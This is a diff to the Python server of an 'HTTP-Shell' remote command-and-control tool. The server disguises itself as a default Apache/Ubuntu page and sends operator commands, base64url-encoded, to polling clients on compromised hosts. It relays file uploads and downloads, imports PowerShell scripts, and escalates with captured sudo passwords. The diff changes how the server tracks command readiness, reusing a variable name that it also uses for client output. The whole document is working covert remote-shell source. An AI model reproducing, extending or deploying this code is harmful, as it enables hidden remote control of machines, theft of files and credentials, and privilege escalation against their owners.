@@ -13,10 +13,11 @@ import neotermcolor
 from neotermcolor import colored
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
+decoded_payload = True
+sudo = False ; root = False
 command = None ; prompt = None
 local_path = None ; remote_path = None
 first_run = True ; wait_for_cmd = False
-sudo = False ; root = False ; cmd_ready = True
 neotermcolor.readline_always_safe = True
 
 banner = """
@@ -75,8 +76,9 @@ class MyServer(BaseHTTPRequestHandler):
             pass
 
     def do_GET(self):
-        global wait_for_cmd ; global root ; global sudo
-        global prompt ; global first_run ; global cmd_ready
+        global decoded_payload
+        global wait_for_cmd ; global root
+        global prompt ; global first_run ; global sudo
         global local_path ; global remote_path ; global command 
         self.server_version = "Apache/2.4.18"
         self.sys_version = "(Ubuntu)"
@@ -91,139 +93,139 @@ class MyServer(BaseHTTPRequestHandler):
                     return
 
             elif self.path == "/api/v1/Client/Token":
-                if cmd_ready:
-                    if root:
-                        whoami = "root"
-                    else:
-                        whoami = prompt.split("!")[0].split("@")[0]
-                    hostname = prompt.split("!")[0].split("@")[1]
-                    path = prompt.split("!")[-1]
-                    cinput = (colored(" [HTTP-Shell] ", "grey", "on_green")) ; cinput += (colored(" ", "green", "on_blue"))
-                    cinput += (colored(str(whoami).rstrip()+"@"+str(hostname).rstrip() + " ", "grey", "on_blue"))
-                    old_user = whoami
+                if root:
+                    whoami = "root"
+                else:
+                    whoami = prompt.split("!")[0].split("@")[0]
+                hostname = prompt.split("!")[0].split("@")[1]
+                path = prompt.split("!")[-1]
+                cinput = (colored(" [HTTP-Shell] ", "grey", "on_green")) ; cinput += (colored(" ", "green", "on_blue"))
+                cinput += (colored(str(whoami).rstrip()+"@"+str(hostname).rstrip() + " ", "grey", "on_blue"))
+                old_user = whoami
 
-                    if "\\" in path:
-                        slash = "\\"
-                    else:
-                        slash = "/"
+                if "\\" in path:
+                    slash = "\\"
+                else:
+                    slash = "/"
 
-                    if len(str(path).rstrip()) > 24:
-                        shortpath = str(path).rstrip().split(slash)[-3:] ; shortpath = ".." + slash + slash.join(map(str, shortpath))
-                        cinput += (colored(" ", "blue", "on_yellow")) ; cinput += (colored(shortpath.rstrip() + " ", "grey", "on_yellow"))
-                    else:
-                        cinput += (colored(" ", "blue", "on_yellow")) ; cinput += (colored(path.rstrip() + " ", "grey", "on_yellow"))
-                    cinput += (colored(" ", "yellow"))
+                if len(str(path).rstrip()) > 24:
+                    shortpath = str(path).rstrip().split(slash)[-3:] ; shortpath = ".." + slash + slash.join(map(str, shortpath))
+                    cinput += (colored(" ", "blue", "on_yellow")) ; cinput += (colored(shortpath.rstrip() + " ", "grey", "on_yellow"))
+                else:
+                    cinput += (colored(" ", "blue", "on_yellow")) ; cinput += (colored(path.rstrip() + " ", "grey", "on_yellow"))
+                cinput += (colored(" ", "yellow"))
+                if decoded_payload:  
                     command = input(cinput + "\001\033[0m\002")
                     split_cmd = command.split()
 
-                    if command == "" or command == None or not command:
-                        print()
-                    
-                    if command == "exit":
-                        if root:
-                            whoami = old_user
-                            root = False ; command = None
-                            print()
-                        else:
-                            print (colored("[!] Exiting..\n", "red"))
-                            exit(0)
-
-                    if command == "kill":
-                        command = "exit"
-
-                    if command == "clear" or command == "cls":
-                        os.system("clear")
-                        pass
-
-                    if "sudo" in command.split()[0]:
-                        if not ":" in path:
-                            args = oslex.split(command)
-                            if len(args) < 2:
-                                print(colored("[!] Usage: sudo command or sudo su\n","red"))
-                                pass
-                            else:
-                                if not sudo:
-                                    old_cmd = ' '.join(args[1:])
-                                    print (colored(f"[sudo] write password for {str(whoami).rstrip()} on next command:\n","red"))
-                                    sudo_pass = pwinput.pwinput(prompt=(cinput + "\001\033[0m\002"))
-                                    command = str("printf '" + sudo_pass + "'" + " | " + "sudo -S " + old_cmd)
-                                    wait_for_cmd = True ; sudo = True
-                                    if "su" in args:
-                                        command = str("printf '" + sudo_pass + "'" + " | " + "sudo -S printf 'HTTPShellNull'")
-                                        root = True
-                                else:
-                                    old_cmd = ' '.join(args[1:])
-                                    command = str("printf 'HTTPShellNull'" + " | " + "sudo -S " + old_cmd)
-                                    if "su" in args:
-                                        command = str("printf 'HTTPShellNull'" + " | " + "sudo -S printf 'HTTPShellNull'")
-                                        root = True
-
-                    if "upload" in command.split()[0]:
-                        args = oslex.split(command)
-                        if len(args) < 3 or len(args) > 3:
-                            print(colored("[!] Usage: upload local_file remote_file\n","red"))
-                            pass
-                        else:
-                            local_path = args[1]
-                            remote_path = args[2]
-                            command = "upload " + args[1] + "!" + args[2]
-                            print(colored(f"[+] Uploading {local_path} in {remote_path}..\n","green"))
-
-                    if "download" in command.split()[0]:
-                        args = oslex.split(command)
-                        if len(args) < 3 or len(args) > 3:
-                            print(colored("[!] Usage: download local_file remote_file\n","red"))
-                            pass
-
-                        else:
-                            remote_path = args[1]
-                            local_path = args[2]
-                            command = "download " + args[1] + "!" + args[2]
-                            print(colored(f"[+] Downloading {remote_path} in {local_path}..\n","green"))
-
-                    if "import-ps1" in command.split()[0]:
-                        args = oslex.split(command)
-                        if len(args) < 2 or len(args) > 2:
-                            print(colored("[!] Usage: import-ps1 /path/script.ps1\n", "red"))
-                            pass 
-                        
-                        else:  
-                            try:
-                                filename = args[1]
-                                with open(filename, "rb") as f:
-                                    command = f.read().decode()
-                                    print(colored(f"[!] File {filename} imported successfully!", "green"))
-
-                            except FileNotFoundError:
-                                print(colored(f"[!] File \"{filename}\" not found!\n", "red"))
-                                command = None
-
-                    if "help" in command.split()[0]:
-                        print(colored("[+] Available commands:","green"))
-                        print(colored("    upload: Upload a file from local to remote computer","blue"))
-                        print(colored("    download: Download a file from remote to local computer","blue"))
-                        print(colored("    import-ps1: Import PowerShell script on Windows hosts","blue"))
-                        print(colored("    clear/cls: Clear terminal screen","blue"))
-                        print(colored("    kill: Kill client connection","blue"))
-                        print(colored("    exit: Exit from program\n","blue"))
-                        pass
-
-                    if command is not None:
-                        if root and not "cd" in command:
-                            if not wait_for_cmd and not "exit" in command:
-                                old_cmd = command
-                                command = str("printf 'HTTPShellNull'" + " | " + "sudo -S " + old_cmd)
- 
-                first_run = False
-                cmd_ready = False
-                encoded_command = "Token: "
-                encoded_command += self.encode_reversed_base64url(command)
-                self._set_headers()
-                self.wfile.write(encoded_command.encode("utf-8"))
+                if command == "" or command == None or not command:
+                    print()
                 
                 if command == "exit":
-                    print (colored("[!] Exiting..\n", "red"))
-                    exit(0)
+                    if root:
+                        whoami = old_user
+                        root = False ; command = None
+                        print()
+                    else:
+                        print (colored("[!] Exiting..\n", "red"))
+                        exit(0)
+
+                if command == "kill":
+                    command = "exit"
+
+                if command == "clear" or command == "cls":
+                    os.system("clear")
+                    pass
+
+                if "sudo" in command.split()[0]:
+                    if not ":" in path:
+                        args = oslex.split(command)
+                        if len(args) < 2:
+                            print(colored("[!] Usage: sudo command or sudo su\n","red"))
+                            pass
+                        else:
+                            if not sudo:
+                                old_cmd = ' '.join(args[1:])
+                                print (colored(f"[sudo] write password for {str(whoami).rstrip()} on next command:\n","red"))
+                                sudo_pass = pwinput.pwinput(prompt=(cinput + "\001\033[0m\002"))
+                                command = str("printf '" + sudo_pass + "'" + " | " + "sudo -S " + old_cmd)
+                                wait_for_cmd = True ; sudo = True
+                                if "su" in args:
+                                    command = str("printf '" + sudo_pass + "'" + " | " + "sudo -S printf 'HTTPShellNull'")
+                                    root = True
+                            else:
+                                old_cmd = ' '.join(args[1:])
+                                command = str("printf 'HTTPShellNull'" + " | " + "sudo -S " + old_cmd)
+                                if "su" in args:
+                                    command = str("printf 'HTTPShellNull'" + " | " + "sudo -S printf 'HTTPShellNull'")
+                                    root = True
+
+                if "upload" in command.split()[0]:
+                    args = oslex.split(command)
+                    if len(args) < 3 or len(args) > 3:
+                        print(colored("[!] Usage: upload local_file remote_file\n","red"))
+                        pass
+                    else:
+                        local_path = args[1]
+                        remote_path = args[2]
+                        command = "upload " + args[1] + "!" + args[2]
+                        print(colored(f"[+] Uploading {local_path} in {remote_path}..\n","green"))
+
+                if "download" in command.split()[0]:
+                    args = oslex.split(command)
+                    if len(args) < 3 or len(args) > 3:
+                        print(colored("[!] Usage: download local_file remote_file\n","red"))
+                        pass
+
+                    else:
+                        remote_path = args[1]
+                        local_path = args[2]
+                        command = "download " + args[1] + "!" + args[2]
+                        print(colored(f"[+] Downloading {remote_path} in {local_path}..\n","green"))
+
+                if "import-ps1" in command.split()[0]:
+                    args = oslex.split(command)
+                    if len(args) < 2 or len(args) > 2:
+                        print(colored("[!] Usage: import-ps1 /path/script.ps1\n", "red"))
+                        pass 
+                    
+                    else:  
+                        try:
+                            filename = args[1]
+                            with open(filename, "rb") as f:
+                                command = f.read().decode()
+                                print(colored(f"[!] File {filename} imported successfully!", "green"))
+
+                        except FileNotFoundError:
+                            print(colored(f"[!] File \"{filename}\" not found!\n", "red"))
+                            command = None
+
+                if "help" in command.split()[0]:
+                    print(colored("[+] Available commands:","green"))
+                    print(colored("    upload: Upload a file from local to remote computer","blue"))
+                    print(colored("    download: Download a file from remote to local computer","blue"))
+                    print(colored("    import-ps1: Import PowerShell script on Windows hosts","blue"))
+                    print(colored("    clear/cls: Clear terminal screen","blue"))
+                    print(colored("    kill: Kill client connection","blue"))
+                    print(colored("    exit: Exit from program\n","blue"))
+                    pass
+
+                if command is not None:
+                    if root and not "cd" in command:
+                        if not wait_for_cmd and not "exit" in command:
+                            old_cmd = command
+                            command = str("printf 'HTTPShellNull'" + " | " + "sudo -S " + old_cmd)
+
+                    first_run = False
+                    decoded_payload = False
+                    encoded_command = "Token: "
+                    encoded_command += self.encode_reversed_base64url(command)
+                    self._set_headers()
+                    self.wfile.write(encoded_command.encode("utf-8"))
+                    
+                    if command == "exit":
+                        print (colored("[!] Exiting..\n", "red"))
+                        exit(0)
                 
             else:
                 itworks_message = "<html><body><h1>It works!</h1><p>This is the default web page for this server.<p></body></html>"
@@ -236,11 +238,12 @@ class MyServer(BaseHTTPRequestHandler):
         except(AttributeError, UnboundLocalError, BrokenPipeError, ConnectionResetError, IndexError, TypeError):
             pass
 
-        return first_run, command, wait_for_cmd, sudo, root, cmd_ready
+        return first_run, command, wait_for_cmd, sudo, root
 
     def do_POST(self):
-        global wait_for_cmd ; global root ; global sudo
-        global prompt ; global first_run ; global cmd_ready
+        global decoded_payload
+        global wait_for_cmd ; global root
+        global prompt ; global first_run ; global sudo
         global local_path ; global remote_path ; global command 
         self.server_version = "Apache/2.4.18"
         self.sys_version = "(Ubuntu)"
@@ -264,15 +267,12 @@ class MyServer(BaseHTTPRequestHandler):
                     file_content = self.decode_file_revbase64url(encoded_payload)
                     f.write(file_content)
                     self.wfile.write(response.encode())
-                    cmd_ready = True
                 return
 
             elif self.path == "/api/v1/Client/Debug":
                 if not first_run and command is not None:
                     if decoded_payload == "" or not decoded_payload:
-                        print()
-                    elif "HTTPShellNull" in decoded_payload:
-                        decoded_payload = None
+                        first_run = True
                         print()
                     else:
                         lines = decoded_payload.split("\n")
@@ -291,16 +291,16 @@ class MyServer(BaseHTTPRequestHandler):
                         decoded_payload = "\n".join(filtered_lines)
                         print(colored(decoded_payload.rstrip()+"\n", "yellow"))
                     else:
-                        print(colored(decoded_payload.rstrip()+"\n", "yellow"))
+                        if "HTTPShellNull" in decoded_payload:
+                            print()
+                        else:
+                            print(colored(decoded_payload.rstrip()+"\n", "yellow"))
                 self.wfile.write(response.encode())
-                cmd_ready = True
 
             elif self.path == "/api/v1/Client/Error":
                 if not first_run and command is not None:
                     if decoded_payload == "" or not decoded_payload:
-                        print()
-                    elif "HTTPShellNull" in decoded_payload:
-                        decoded_payload = None
+                        first_run = True
                         print()
                     else:
                         lines = decoded_payload.split("\n")
@@ -333,9 +333,11 @@ class MyServer(BaseHTTPRequestHandler):
                     elif "No such file or directory" in decoded_payload:
                         print(colored(decoded_payload.rstrip()+"\n", "red"))
                     else:
-                        print(colored(decoded_payload.rstrip()+"\n", "red")) 
+                        if "HTTPShellNull" in decoded_payload:
+                            print()
+                        else:
+                            print(colored(decoded_payload.rstrip()+"\n", "red"))
                 self.wfile.write(response.encode())
-                cmd_ready = True
 
             else:
                 itworks_message = "<html><body><h1>It works!</h1><p>This is the default web page for this server.<p></body></html>"
@@ -344,12 +346,11 @@ class MyServer(BaseHTTPRequestHandler):
                 self.send_header("Content-Length", len(itworks_message))
                 self.end_headers()
                 self.wfile.write(itworks_message.encode())
-                cmd_ready = True
 
         except:
             pass
 
-        return prompt, cmd_ready
+        return prompt, decoded_payload
 
     def log_message(self, format, *args):
             pass
